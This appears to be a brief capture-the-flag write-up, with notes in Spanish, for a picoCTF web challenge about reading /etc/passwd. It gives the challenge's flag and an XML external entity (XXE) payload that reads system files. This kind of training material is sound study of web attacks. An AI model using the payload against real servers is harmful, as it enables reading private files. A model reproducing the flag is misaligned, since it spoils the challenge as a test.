## Description

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.
### Solucion

```
picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e}
```
### Notas Adicionales
usar este payload para leer archivos
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">  <!-- Define una entidad que lee un archivo del sistema -->
]>
### Referencias
https://youtu.be/b1pGlutUL34